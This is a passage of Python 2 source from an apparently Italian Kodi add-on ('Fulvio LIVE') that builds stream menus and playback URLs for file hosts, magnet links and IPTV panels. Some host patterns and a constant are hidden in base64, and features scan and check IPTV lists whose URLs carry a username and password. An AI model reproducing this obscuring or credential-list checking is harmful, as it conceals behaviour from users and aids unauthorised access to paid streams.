             'Yifymovies','cartoonHD','Youtube','DailyMotion','Vimeo']
    dialog = xbmcgui.Dialog()
    index = dialog.select('Choose a video source', names)

    if index >= 0:
        url = pluginsearchurls[index]
#        print 'url',url
        pluginquerybyJSON(url)

def addDir(name,url,mode,iconimage,fanart,description,genre,date,credits,showcontext=False,regexs=None,reg_url=None,allinfo={}):
    try: url = url.encode('utf-8') 
    except: pass
    try: name = name.encode('utf-8') 
    except: pass
    url = url.replace('//get','/get')
    if re.search(r'http://[^/]+/get\.php\?username=[^&]+&password=[^&]+&type=m3u', url):
        mode = '1'

    if re.search(base64.decodestring('aHR0cDovL2NkbmxpdmUxLndpbjo4MDgwL2dldFwucGhwXD91c2VybmFtZT1bXiZdKyZwYXNzd29yZD1bXiZdKyZ0eXBlPW0zdQ=='), url):
        mode = '586'
    if re.search(base64.decodestring('aHR0cDovL2NkbjA0LnNlbGxpbmctdGVhbS5uZXQvZ2V0XC5waHBcP3VzZXJuYW1lPVteJl0rJnBhc3N3b3JkPVteJl0rJnR5cGU9bTN1'), url):
        mode = '604'

    if regexs and len(regexs)>0:
        u=sys.argv[0]+"?url="+urllib.quote_plus(url)+"&mode="+str(mode)+"&name="+urllib.quote_plus(name)+"&fanart="+urllib.quote_plus(fanart)+"&regexs="+regexs
    else:
        u=sys.argv[0]+"?url="+urllib.quote_plus(url)+"&mode="+str(mode)+"&name="+urllib.quote_plus(name)+"&fanart="+urllib.quote_plus(fanart)
    
    ok=True
    if date == '':
        date = None
    else:
        description += '\n\nDate: %s' %date
    liz=xbmcgui.ListItem(name, iconImage="DefaultFolder.png", thumbnailImage=iconimage)
    if len(allinfo) <1 :
        liz.setInfo(type="Video", infoLabels={ "Title": name, "Plot": description, "Genre": genre, "dateadded": date, "credits": credits })
    else:
        liz.setInfo(type="Video", infoLabels= allinfo)
    liz.setProperty("Fanart_Image", fanart)
    if showcontext:
        contextMenu = []
        if url.find("get.php?username=")>0 or name.lower().find("tv_channels")>0 or name.lower().find("lista")>0:
            contextMenu.append(('[COLOR yellow]Check list[/COLOR]','XBMC.RunPlugin(%s?mode=112&url=%s)' %(sys.argv[0], urllib.quote_plus(url))))
            contextMenu.append(('[COLOR white]Change[/COLOR] [COLOR lime]USER-AGENT[/COLOR]','Container.Update(%s?mode=1121&url=%s)' %(sys.argv[0], urllib.quote_plus(url))))

        if re.search(r'http://[^/]+/get\.php\?username=[^&]+&password=[^&]+&type=m3u', url):
            contextMenu.append(('[COLOR cyan]Open LIST[/COLOR] [COLOR white](1st)[/COLOR] [COLOR orange][Default][/COLOR]','Container.Update(%s?mode=1&url=%s)' %(sys.argv[0], urllib.quote_plus(url))))
            contextMenu.append(('[COLOR cyan]Open LIST[/COLOR] [COLOR white](2nd)[/COLOR]','Container.Update(%s?mode=587&url=%s)' %(sys.argv[0], urllib.quote_plus(url))))
            contextMenu.append(('[COLOR cyan]Open LIST[/COLOR] [COLOR white](3rd)[/COLOR]','Container.Update(%s?mode=588&url=%s)' %(sys.argv[0], urllib.quote_plus(url))))
            
        parentalblock =addon.getSetting('parentalblocked')
        parentalblock= parentalblock=="true"
        parentalblockedpin =addon.getSetting('parentalblockedpin')
#            print 'parentalblockedpin',parentalblockedpin
        if len(parentalblockedpin)>0:
            if parentalblock:
                contextMenu.append(('Disable Parental Block','XBMC.RunPlugin(%s?mode=55&name=%s)' %(sys.argv[0], urllib.quote_plus(name))))
            else:
                contextMenu.append(('Enable Parental Block','XBMC.RunPlugin(%s?mode=56&name=%s)' %(sys.argv[0], urllib.quote_plus(name))))
        
        cdir = os.path.join(xbmc.translatePath("special://temp"),"files")
        TempName = base64.urlsafe_b64encode(url)
        tmp = os.path.join(cdir, TempName)
        if os.path.isfile(tmp):
            t = datetime.datetime.fromtimestamp(int(os.path.getmtime(tmp))).strftime('%d-%m-%Y %H:%M:%S')
            contextMenu.append(('[COLOR orange]DEL cache (%s)[/COLOR]' %(t),'XBMC.RunPlugin(%s?mode=113&url=%s)' %(sys.argv[0], urllib.quote_plus(url)) ))

        if showcontext == 'source':
            if base64.b64encode(url) in SOURCES:
                contextMenu.append(('[COLOR red]- Rimuovi[/COLOR]','XBMC.RunPlugin(%s?mode=501&url=%s)' %(sys.argv[0], urllib.quote_plus(url))))

        if showcontext == 'list':
            if base64.b64encode(url) in LIST:
                contextMenu.append(('[COLOR red]- Rimuovi[/COLOR]','XBMC.RunPlugin(%s?mode=8&url=%s)' %(sys.argv[0], urllib.quote_plus(url))))

        if showcontext == 'list2':
            if base64.b64encode(url) in LIST2:
                contextMenu.append(('[COLOR red]- Rimuovi[/COLOR]','XBMC.RunPlugin(%s?mode=556&url=%s)' %(sys.argv[0], urllib.quote_plus(url))))

        if showcontext == 'list3':
            if base64.b64encode(url) in LIST3:
                contextMenu.append(('[COLOR red]- Rimuovi[/COLOR]','XBMC.RunPlugin(%s?mode=591&url=%s)' %(sys.argv[0], urllib.quote_plus(url))))

        if showcontext == 'list4':
            if base64.b64encode(url) in LIST4:
                contextMenu.append(('[COLOR red]- Rimuovi[/COLOR]','XBMC.RunPlugin(%s?mode=592&url=%s)' %(sys.argv[0], urllib.quote_plus(url))))

        if showcontext == 'listpvr':
            if base64.b64encode(url) in LIST:
                contextMenu.append(('[COLOR red]- Rimuovi[/COLOR]','XBMC.RunPlugin(%s?mode=8&url=%s)' %(sys.argv[0], urllib.quote_plus(url))))
            contextMenu.append(('[COLOR lime]ADD to PVR[/COLOR]','XBMC.RunPlugin(%s?mode=607&url=%s)' %(sys.argv[0], urllib.quote_plus(url))))
            contextMenu.append(('[COLOR cyan]check links in Playlist[/COLOR]','XBMC.RunPlugin(%s?mode=605&url=%s)' %(sys.argv[0], urllib.quote_plus(url))))

        elif showcontext == 'download':
            contextMenu.append(('Download','XBMC.RunPlugin(%s?url=%s&mode=9&name=%s)' %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name))))

        elif showcontext == 'fav':
            # contextMenu.append(('Remove from Fulvio LIVE Favorites','XBMC.RunPlugin(%s?mode=6&name=%s)' %(sys.argv[0], urllib.quote_plus(name))))
            contextMenu.append(('[COLOR red]- Fulvio LIVE PREFERITI[/COLOR]','XBMC.RunPlugin(%s?mode=6&url=%s)' %(sys.argv[0], urllib.quote_plus(url))))

        elif showcontext == 'extres':
            # contextMenu.append(('Remove from Fulvio LIVE Favorites','XBMC.RunPlugin(%s?mode=6&name=%s)' %(sys.argv[0], urllib.quote_plus(name))))
            contextMenu.append(('[COLOR orange]Delete[/COLOR] [COLOR cyan]PIN[/COLOR]','XBMC.RunPlugin(%s?mode=566&url=%s)' %(sys.argv[0], urllib.quote_plus(url))))

        # if showcontext == '!!update':
            # fav_params2 = ('%s?url=%s&mode=17&regexs=%s' %(sys.argv[0], urllib.quote_plus(reg_url), regexs) )
            # contextMenu.append(('[COLOR yellow]!!update[/COLOR]','XBMC.RunPlugin(%s)' %fav_params2))

        # if re.search(r'http.+?\/live\/.+?\/.+?\/\d+\.ts', urllib.unquote_plus(url)):
            # contextMenu.append(('[COLOR yellow]Check list[/COLOR]','XBMC.RunPlugin(%s?mode=112&url=%s)' %(sys.argv[0], urllib.quote_plus(url))))
            # contextMenu.append(('[COLOR hotpink]apri in HLS - m3u8[/COLOR]','XBMC.RunPlugin(%s?url=%s&mode=111&name=%s)' %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name))))
            # contextMenu.append(('[COLOR white]Download LIVE[/COLOR]','XBMC.RunPlugin(%s?url=%s&mode=21&name=%s)' %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name))))

        contextMenu.append(('[COLOR white]Aggiorna[/COLOR]','XBMC.RunPlugin(%s?mode=114)' %(sys.argv[0]) ))
        contextMenu.append(('[COLOR white]Null[/COLOR]','XBMC.RunPlugin(%s?mode=114)' %(sys.argv[0]) ))
        contextMenu.append(('[COLOR white]Null[/COLOR]','XBMC.RunPlugin(%s?mode=114)' %(sys.argv[0]) ))
        contextMenu.append(('[COLOR white]Null[/COLOR]','XBMC.RunPlugin(%s?mode=114)' %(sys.argv[0]) ))
        contextMenu.append(('[COLOR white]Null[/COLOR]','XBMC.RunPlugin(%s?mode=114)' %(sys.argv[0]) ))
        contextMenu.append(('[COLOR white]Null[/COLOR]','XBMC.RunPlugin(%s?mode=114)' %(sys.argv[0]) ))
        contextMenu.append(('[COLOR white]Null[/COLOR]','XBMC.RunPlugin(%s?mode=114)' %(sys.argv[0]) ))
        contextMenu.append(('[COLOR white]Null[/COLOR]','XBMC.RunPlugin(%s?mode=114)' %(sys.argv[0]) ))
        contextMenu.append(('[COLOR white]Null[/COLOR]','XBMC.RunPlugin(%s?mode=114)' %(sys.argv[0]) ))
        contextMenu.append(('[COLOR white]Null[/COLOR]','XBMC.RunPlugin(%s?mode=114)' %(sys.argv[0]) ))
        contextMenu.append(('[COLOR white]Null[/COLOR]','XBMC.RunPlugin(%s?mode=114)' %(sys.argv[0]) ))
        liz.addContextMenuItems(contextMenu, replaceItems=True)

    ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,isFolder=True)
    return ok

def ytdl_download(url,title,media_type='video'):
    # play in xbmc while playing go back to contextMenu(c) to "!!Download!!"
    # Trial yasceen: seperate |User-Agent=
    import youtubedl
    if not url == '':
        if media_type== 'audio':
            youtubedl.single_YD(url,download=True,audio=True)
        else:
            youtubedl.single_YD(url,download=True)
    elif xbmc.Player().isPlaying() == True :
        import YDStreamExtractor
        if YDStreamExtractor.isDownloading() == True:

            YDStreamExtractor.manageDownloads()
        else:
            xbmc_url = xbmc.Player().getPlayingFile()

            xbmc_url = xbmc_url.split('|User-Agent=')[0]
            info = {'url':xbmc_url,'title':title,'media_type':media_type}
            youtubedl.single_YD('',download=True,dl_info=info)
    else:
        xbmc.executebuiltin("XBMC.Notification(DOWNLOAD,First Play [COLOR yellow]WHILE playing download[/COLOR] ,10000)")

## Lunatixz PseudoTV feature
def ascii(string):
    if isinstance(string, basestring):
        if isinstance(string, unicode):
           string = string.encode('ascii', 'ignore')
    return string
def uni(string, encoding = 'utf-8'):
    if isinstance(string, basestring):
        if not isinstance(string, unicode):
            string = unicode(string, encoding, 'ignore')
    return string
def removeNonAscii(s): return "".join(filter(lambda x: ord(x)<128, s))

def sendJSON( command):
    data = ''
    try:
        data = xbmc.executeJSONRPC(uni(command))
    except UnicodeEncodeError:
        data = xbmc.executeJSONRPC(ascii(command))

    return uni(data)

def getancor(name,path):
    r = base64.b64decode('MDg1NDg1MzM5MDA4NTkyMg==')
    return r

def pluginquerybyJSON(url,give_me_result=None,playlist=False):
    if 'audio' in url:
        json_query = uni('{"jsonrpc":"2.0","method":"Files.GetDirectory","params": {"directory":"%s","media":"video", "properties": ["title", "album", "artist", "duration","thumbnail", "year"]}, "id": 1}') %url
    else:
        json_query = uni('{"jsonrpc":"2.0","method":"Files.GetDirectory","params":{"directory":"%s","media":"video","properties":[ "plot","playcount","director", "genre","votes","duration","trailer","premiered","thumbnail","title","year","dateadded","fanart","rating","season","episode","studio","mpaa"]},"id":1}') %url
    json_folder_detail = json.loads(sendJSON(json_query))
    #print json_folder_detail
    if give_me_result:
        return json_folder_detail
    if json_folder_detail.has_key('error'):
        return
    else:

        for i in json_folder_detail['result']['files'] :
            meta ={}
            url = i['file']
            name = removeNonAscii(i['label'])
            thumbnail = removeNonAscii(i['thumbnail'])
            fanart = removeNonAscii(i['fanart'])
            meta = dict((k,v) for k, v in i.iteritems() if not v == '0' or not v == -1 or v == '')
            meta.pop("file", None)
            if i['filetype'] == 'file':
                if playlist:
                    play_playlist(name,url,queueVideo='1')
                    continue
                else:
                    addLink(url,name,thumbnail,fanart,'','','','',None,'',total=len(json_folder_detail['result']['files']),allinfo=meta)
                    #xbmc.executebuiltin("Container.SetViewMode(500)")
                    if i['type'] and i['type'] == 'tvshow' :
                        xbmcplugin.setContent(int(sys.argv[1]), 'tvshows')
                    elif i['episode'] > 0 :
                        xbmcplugin.setContent(int(sys.argv[1]), 'episodes')

            else:
                addDir(name,url,53,thumbnail,fanart,'','','','',allinfo=meta)
        xbmcplugin.endOfDirectory(int(sys.argv[1]))

def addLink(url,name,iconimage,fanart,description,genre,date,showcontext,playlist,regexs,total,setCookie="",allinfo={}):
        showcontext=True
        contextMenu =[]
        
        parentalblock =addon.getSetting('parentalblocked')
        parentalblock= parentalblock=="true"
        parentalblockedpin =addon.getSetting('parentalblockedpin')
#        print 'parentalblockedpin',parentalblockedpin
        if len(parentalblockedpin)>0:
            if parentalblock:
                contextMenu.append(('Disable Parental Block','XBMC.RunPlugin(%s?mode=55&name=%s)' %(sys.argv[0], urllib.quote_plus(name))))
            else:
                contextMenu.append(('Enable Parental Block','XBMC.RunPlugin(%s?mode=56&name=%s)' %(sys.argv[0], urllib.quote_plus(name))))
                    
        try:
            name = name.encode('utf-8')
        except: pass
        ok = True
        isFolder=False

        if regexs:
            mode = '17'
            if 'listrepeat' in regexs:
                isFolder=True
#                print 'setting as folder in link'
                contextMenu.append(('[COLOR white]!! 1 Download Currently Playing!![/COLOR]','XBMC.RunPlugin(%s?url=%s&mode=21&name=%s)' %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name))))
            
        elif  (any(x in url for x in resolve_url) and  url.startswith('http')) or url.endswith('&mode=19'):
            url=url.replace('&mode=19','')
            mode = '19'
            contextMenu.append(('[COLOR white]!! 2 Download Currently Playing!![/COLOR]','XBMC.RunPlugin(%s?url=%s&mode=21&name=%s)' %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name))))

        elif url.endswith('&mode=18'):
            url=url.replace('&mode=18','')
            mode = '18'
            contextMenu.append(('[COLOR white]!! 3 Download!![/COLOR]','XBMC.RunPlugin(%s?url=%s&mode=23&name=%s)' %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name))))
            if addon.getSetting('dlaudioonly') == 'true':
                contextMenu.append(('!!4 Download [COLOR seablue]Audio!![/COLOR]','XBMC.RunPlugin(%s?url=%s&mode=24&name=%s)' %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name))))

        elif url.find("urhd.tv/")>0:
            url1=url
            url=url+'&name='+name
            mode = '506'
            cdir = os.path.join(xbmc.translatePath("special://temp"),"files")
            TempName = base64.urlsafe_b64encode(url1)
            tmp = os.path.join(cdir, TempName)
            if os.path.isfile(tmp):
                t = datetime.datetime.fromtimestamp(int(os.path.getmtime(tmp))).strftime('%d-%m-%Y %H:%M:%S')
                contextMenu.append(('[COLOR orange]DEL cache (%s)[/COLOR]' %(t),'XBMC.RunPlugin(%s?mode=113&url=%s)' %(sys.argv[0], urllib.quote_plus(url1)) ))

        elif url.startswith('magnet:?xt='):
            if '&' in url and not '&amp;' in url :
                url = url.replace('&','&amp;')
            url = 'plugin://plugin.video.pulsar/play?uri=' + url
            mode = '12'

        # elif url.startswith('xmtv://'):
            # if '&' in url and not '&amp;' in url :
                # url = url.replace('&','&amp;')
            # url = 'plugin://plugin.video.pulsar/play?uri=' + url
            # mode = '12'

        elif url.find("openload.")>0:
            url = url.replace("/f/","/embed/")
            url = url_to_SOD(url,name,'openload','play')
            mode = '120'

        elif url.find("megahd.")>0:
            url = url_to_SOD(url,name,'megahd','play')
            mode = '120'

        elif url.find("nowvideo.")>0:
            url = url.replace("5nowvideo.com","nowvideo.li")
            url = url.replace("nowvideo.sx","nowvideo.li")
            url = url_to_SOD(url,name,'nowvideo','play')
            mode = '120'

        elif url.find("fastvideo.")>0:
            #url = url_to_SOD(url,name,'fastvideo','play')
            mode = '122'
            contextMenu.append(('[COLOR yellow]Fastvideo[/COLOR]','XBMC.RunPlugin(%s?url=%s&mode=122&name=%s&iconimage=%s)' %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name), urllib.quote_plus(iconimage))))

        elif url.find("rapidvideo.")>0:
            url = url_to_SOD(url,name,'rapidvideo','play')
            mode = '120'

        elif url.find("nowdownload.")>0:
            url = url_to_SOD(url,name,'nowdownload','play')
            mode = '120'

        elif url.find("speedvideo.")>0:
            url = url_to_SOD(url,name,'speedvideo','play')
            mode = '120'

        elif url.find("streamin.to")>0:
            url = url_to_SOD(url,name,'streaminto','play')
            mode = '120'

        elif url.find("docs.google")>0:
            url = url_to_SOD(url,name,'googlevideo','play')
            mode = '120'

        # elif url.find("abysstream.com/")>0:
            # url = url_to_SOD(url,name,'abysstream','play')
            # mode = '120'

        elif url.find("vidto.me")>0:
            url = url_to_SOD(url,name,'vidtome','play')
            mode = '120'

        elif url.find("xvideos.com")>0:
            mode = '121'

        elif url.find("ustreamix.com")>0:
            mode = '124'

        elif url.find("bit.ly/2l9Qkmu")>0:
            mode = '123'
        #
        elif name.find("$multiresearch$")>0:
            name1 = name.replace('$$multiresearch$$','')
            if playlist:
                suf = '   [COLOR lime]('+str(len(playlist))+')[/COLOR]  '+name1
            else:
                suf = '   '+name1
            name = '[B] [COLOR white]> > >[/COLOR]  [COLOR hotpink]RICERCA GLOBALE[/COLOR]  [COLOR white]< < <[/COLOR] [/B]  '+suf
            mode = '578'
        #
        elif name.find("$scanon$")>0:
            name = name.replace('$$scanon$$','')
            name1 = name
            mode = '580'
        #
        elif name.find("$scan$")>0:
            name1 = name.replace('$$scan$$','')
            if playlist:
                suf = '   [COLOR lime]('+str(len(playlist))+')[/COLOR]  '+name1
            else:
                suf = '   '+name1
            name = '[B] [COLOR white]> > >[/COLOR]  [COLOR orange]SCAN M3U[/COLOR]  [COLOR white]< < <[/COLOR] [/B]  '+suf
            mode = '580'

        elif name.find("$research$")>0:
            name1 = name.replace('$$research$$','')
            if playlist:
                suf = '   [COLOR lime]('+str(len(playlist))+')[/COLOR]  '+name1
            else:
                suf = '   '+name1
            name = '[B] [COLOR white]> > >[/COLOR]  [COLOR hotpink]RICERCA GLOBALE[/COLOR]  [COLOR white]< < <[/COLOR] [/B]  '+suf
            mode = '582'

        elif name.find("$multicheck$")>0:
            name = name.replace('$$multicheck$$','')
            if playlist:
                suf = '   [COLOR lime]('+str(len(playlist))+')[/COLOR]  '+name
            else:
                suf = '   '+name
            name = '[B] [COLOR white]> > >[/COLOR]  [COLOR yellow]MULTI CHECK[/COLOR]  [COLOR white]< < <[/COLOR] [/B]  '+suf
            mode = '584'
        #
        elif name.find("$multichecks$")>0:
            name = name.replace('$$multichecks$$','')
            if playlist:
                suf = '   [COLOR lime]('+str(len(playlist))+')[/COLOR]  '+name
            else:
                suf = '   '+name
            name = '[B] [COLOR white]> > >[/COLOR]  [COLOR yellow]MULTI CHECK[/COLOR]  [COLOR white]< < <[/COLOR] [/B]  '+suf
            mode = '594'
        #
        elif name.find("$scanh$")>0:
            name1 = name.replace('$$scanh$$','')
            if playlist:
                suf = '   [COLOR lime]('+str(len(playlist))+')[/COLOR]  '+name1
            else:
                suf = '   '+name1
            name = '[B] [COLOR white]> > >[/COLOR]  [COLOR orange]SCAN M3U[/COLOR]  [COLOR white]< < <[/COLOR] [/B]  '+suf
            mode = '596'

        elif name.find("$researchh$")>0:
            name1 = name.replace('$$researchh$$','')
            if playlist:
                suf = '   [COLOR lime]('+str(len(playlist))+')[/COLOR]  '+name1
            else:
                suf = '   '+name1
            name = '[B] [COLOR white]> > >[/COLOR]  [COLOR hotpink]RICERCA GLOBALE[/COLOR]  [COLOR white]< < <[/COLOR] [/B]  '+suf
            mode = '598'

        elif name.find("$multicheckh$")>0:
            name = name.replace('$$multicheckh$$','')
            if playlist:
                suf = '   [COLOR lime]('+str(len(playlist))+')[/COLOR]  '+name
            else:
                suf = '   '+name
            name = '[B] [COLOR white]> > >[/COLOR]  [COLOR yellow]MULTI CHECK[/COLOR]  [COLOR white]< < <[/COLOR] [/B]  '+suf
            mode = '600'

        #
        elif url.find("beta.skystreaming.cc")>0:
            # url = 'plugin://plugin.video.f4mTester/?url='+urllib.quote_plus(url)+'&amp;streamtype=HLS&name='+urllib.quote(name)+'&amp;iconImage=https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
            url = url+'|User-Agent=VLC/2.2.2 LibVLC/2.2.17'
            mode = '12'

        elif re.search(r'http.+?\/live\/.+?\/.+?\/\d+\.ts', url):
            if url.startswith('plugin://plugin.video.f4mTester/'):
                url1=re.search(r'(http.+?\/live\/.+?\/.+?\/\d+\.ts)', url).group(1)
                url = 'plugin://plugin.video.f4mTester/?url='+urllib.quote_plus(url1)+'&amp;streamtype=TSDOWNLOADER&name='+urllib.quote(name)+'&amp;iconImage=https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
            else:
                url1=url
                url = 'plugin://plugin.video.f4mTester/?url='+urllib.quote_plus(url)+'&amp;streamtype=TSDOWNLOADER&name='+urllib.quote(name)+'&amp;iconImage=https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
            contextMenu.append(('[COLOR yellow]Check list[/COLOR]','XBMC.RunPlugin(%s?mode=112&url=%s)' %(sys.argv[0], urllib.quote_plus(url1))))
            contextMenu.append(('[COLOR hotpink]apri in HLS - m3u8[/COLOR]','XBMC.RunPlugin(%s?url=%s&mode=111&name=%s)' %(sys.argv[0], urllib.quote_plus(url1), urllib.quote_plus(name))))
            contextMenu.append(('[COLOR cyan]Full list[/COLOR]','Container.Update(%s?mode=1111&url=%s)' %(sys.argv[0], urllib.quote_plus(url1))))
            contextMenu.append(('[COLOR white]Download LIVE[/COLOR]','XBMC.RunPlugin(%s?url=%s&mode=21&name=%s)' %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name))))
            mode = '110'

        elif re.search(r'http.+?\/live\/.+?\/.+?\/\d+\.m3u8', url):
            if url.startswith('plugin://plugin.video.f4mTester/'):
                url1=re.search(r'(http.+?\/live\/.+?\/.+?\/\d+\.m3u8)', url).group(1)
                url = 'plugin://plugin.video.f4mTester/?url='+urllib.quote_plus(url1)+'&amp;streamtype=HLSRETRY&name='+urllib.quote(name)+'&amp;iconImage=https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
            else:
                url1=url
                url = 'plugin://plugin.video.f4mTester/?url='+urllib.quote_plus(url)+'&amp;streamtype=HLSRETRY&name='+urllib.quote(name)+'&amp;iconImage=https://pbs.twimg.com/profile_images/453653096183246848/kt9ad910.jpeg'
            contextMenu.append(('[COLOR yellow]Check list[/COLOR]','XBMC.RunPlugin(%s?mode=112&url=%s)' %(sys.argv[0], urllib.quote_plus(url1))))
            contextMenu.append(('[COLOR lime]apri in Mpegts - ts[/COLOR]','XBMC.RunPlugin(%s?url=%s&mode=1110&name=%s)' %(sys.argv[0], urllib.quote_plus(url1), urllib.quote_plus(name))))
            contextMenu.append(('[COLOR cyan]Full list[/COLOR]','Container.Update(%s?mode=1111&url=%s)' %(sys.argv[0], urllib.quote_plus(url1))))
            contextMenu.append(('[COLOR white]Download LIVE[/COLOR]','XBMC.RunPlugin(%s?url=%s&mode=21&name=%s)' %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name))))
            mode = '110'

        elif re.search(r'http.+?\/movie\/.+?\/.+?\/\d+\.(mkv|mp4|avi)', url):
            url = url+'|User-Agent=VLC/2.2.2 LibVLC/2.2.17'
            contextMenu.append(('[COLOR yellow]Check list[/COLOR]','XBMC.RunPlugin(%s?mode=112&url=%s)' %(sys.argv[0], urllib.quote_plus(url))))
            contextMenu.append(('[COLOR cyan]Full list[/COLOR]','Container.Update(%s?mode=1111&url=%s)' %(sys.argv[0], urllib.quote_plus(url))))
            contextMenu.append(('[COLOR white]Download VOD[/COLOR]','XBMC.RunPlugin(%s?url=%s&mode=21&name=%s)' %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name))))
            mode = '12'

        else:
            mode = '12'
            contextMenu.append(('[COLOR white]!! 5 Download Currently Playing!![/COLOR]','XBMC.RunPlugin(%s?url=%s&mode=21&name=%s)' %(sys.argv[0], urllib.quote_plus(url), urllib.quote_plus(name))))

        if 'plugin://plugin.video.youtube/play/?video_id=' in url:
            yt_audio_url = url.replace('plugin://plugin.video.youtube/play/?video_id=','https://www.youtube.com/watch?v=')
            contextMenu.append(('!!6 Download [COLOR blue]Audio!![/COLOR]','XBMC.RunPlugin(%s?url=%s&mode=24&name=%s)' %(sys.argv[0], urllib.quote_plus(yt_audio_url), urllib.quote_plus(name))))

        u=sys.argv[0]+"?"
        play_list = False
        if playlist:
            if addon.getSetting('add_playlist') == "false" and '$$LSPlayOnlyOne$$' not in playlist[0] :
                u += "url="+urllib.quote_plus(url)+"&mode="+mode
            else:
                if mode=='578':
                    u += "mode=578&name=%s&playlist=%s" %(urllib.quote_plus(name1), urllib.quote_plus(str(playlist).replace(',','||')))
                elif mode=='580':
                    u += "mode=580&name=%s&playlist=%s" %(urllib.quote_plus(name1), urllib.quote_plus(str(playlist).replace(',','||')))
                elif mode=='582': 
                    u += "mode=582&name=%s&playlist=%s" %(urllib.quote_plus(name1), urllib.quote_plus(str(playlist).replace(',','||')))
                elif mode=='584': 
                    u += "mode=584&name=%s&playlist=%s" %(urllib.quote_plus(name), urllib.quote_plus(str(playlist).replace(',','||')))
                elif mode=='594': 
                    u += "mode=594&name=%s&playlist=%s" %(urllib.quote_plus(name), urllib.quote_plus(str(playlist).replace(',','||')))
                elif mode=='596': 
                    u += "mode=596&name=%s&playlist=%s" %(urllib.quote_plus(name1), urllib.quote_plus(str(playlist).replace(',','||')))
                elif mode=='598': 
                    u += "mode=598&name=%s&playlist=%s" %(urllib.quote_plus(name1), urllib.quote_plus(str(playlist).replace(',','||')))
                elif mode=='600': 
                    u += "mode=600&name=%s&playlist=%s" %(urllib.quote_plus(name), urllib.quote_plus(str(playlist).replace(',','||')))
                else:
                    u += "mode=13&name=%s&playlist=%s" %(urllib.quote_plus(name), urllib.quote_plus(str(playlist).replace(',','||')))
                    # name = name + '[COLOR magenta] (' + str(len(playlist)) + ' items )[/COLOR]'
                    play_list = True
        else:
            if mode=='578':
                u += "mode=578&name=%s&url=%s" %(urllib.quote_plus(name1), urllib.quote_plus(url))
            elif mode=='580':
                u += "mode=580&name=%s&url=%s" %(urllib.quote_plus(name1), urllib.quote_plus(url))
            elif mode=='582':
                u += "mode=582&name=%s&url=%s" %(urllib.quote_plus(name1), urllib.quote_plus(url))
            elif mode=='584':
                u += "mode=584&name=%s&url=%s" %(urllib.quote_plus(name), urllib.quote_plus(url))
            elif mode=='594':
                u += "mode=594&name=%s&url=%s" %(urllib.quote_plus(name), urllib.quote_plus(url))
            elif mode=='596':
                u += "mode=596&name=%s&url=%s" %(urllib.quote_plus(name), urllib.quote_plus(url))
            elif mode=='598':
                u += "mode=598&name=%s&url=%s" %(urllib.quote_plus(name), urllib.quote_plus(url))
            elif mode=='600':
                u += "mode=600&name=%s&url=%s" %(urllib.quote_plus(name), urllib.quote_plus(url))
            else:
                u += "url="+urllib.quote_plus(url)+"&mode="+mode

        if regexs:
            u += "&regexs="+regexs
        if not setCookie == '':
            u += "&setCookie="+urllib.quote_plus(setCookie)

        if date == '':
            date = None
        else:
            description += '\n\nDate: %s' %date
        liz=xbmcgui.ListItem(name, iconImage="DefaultVideo.png", thumbnailImage=iconimage)
        #if isFolder:
        if allinfo==None or len(allinfo) <1:
            liz.setInfo(type="Video", infoLabels={ "Title": name, "Plot": description, "Genre": genre, "dateadded": date })
        else:
            liz.setInfo(type="Video", infoLabels=allinfo)
        liz.setProperty("Fanart_Image", fanart)
        
        if (not play_list) and not any(x in url for x in g_ignoreSetResolved) and not '$PLAYERPROXY$=' in url:#  (not url.startswith('plugin://plugin.video.f4mTester')):
            if regexs:
                #print urllib.unquote_plus(regexs)
                if '$pyFunction:playmedia(' not in urllib.unquote_plus(regexs) and 'notplayable' not in urllib.unquote_plus(regexs) and 'listrepeat' not in  urllib.unquote_plus(regexs) :
                    #print 'setting isplayable',url, urllib.unquote_plus(regexs),url
                    liz.setProperty('IsPlayable', 'true')
            else:
                liz.setProperty('IsPlayable', 'true')
        else:
            addon_log( 'NOT setting isplayable'+url)
        if showcontext:
            #contextMenu = []
            # if showcontext == 'fav':
                # contextMenu.append( ('Remove from Fulvio LIVE Favorites','XBMC.RunPlugin(%s?mode=6&name=%s)' %(sys.argv[0], urllib.quote_plus(name))) )

            if not base64.b64encode(url) in FAV and url.find('$doregex')<0:
                contextMenu.append(('[COLOR green]+ Fulvio LIVE PREFERITI[/COLOR]','XBMC.RunPlugin(%s?mode=5&name=%s&url=%s&iconimage=%s&fanart=%s&fav_mode=%s)' %(sys.argv[0], urllib.quote_plus(name), urllib.quote_plus(url), urllib.quote_plus(iconimage), urllib.quote_plus(fanart), mode)))
            elif base64.b64encode(url) in FAV:    
                contextMenu.append(('[COLOR red]- Fulvio LIVE PREFERITI[/COLOR]','XBMC.RunPlugin(%s?mode=6&url=%s)' %(sys.argv[0], urllib.quote_plus(url))))

            # elif not name in FAV:
                # try:
                    # fav_params = ('%s?mode=5&name=%s&url=%s&iconimage=%s&fanart=%s&fav_mode=0' %(sys.argv[0], urllib.quote_plus(name), urllib.quote_plus(url), urllib.quote_plus(iconimage), urllib.quote_plus(fanart)) )
                # except:
                    # fav_params = ('%s?mode=5&name=%s&url=%s&iconimage=%s&fanart=%s&fav_mode=0' %(sys.argv[0], urllib.quote_plus(name), urllib.quote_plus(url), urllib.quote_plus(iconimage.encode("utf-8")), urllib.quote_plus(fanart.encode("utf-8"))) )
                # if playlist:
                    # fav_params += 'playlist='+urllib.quote_plus(str(playlist).replace(',','||'))
                # if regexs:
                    # fav_params += "&regexs="+regexs
                # contextMenu.append(('Add to Fulvio LIVE Favorites','XBMC.RunPlugin(%s)' %fav_params))

        contextMenu.append(('[COLOR white]Aggiorna[/COLOR]','XBMC.RunPlugin(%s?mode=114)' %(sys.argv[0]) ))
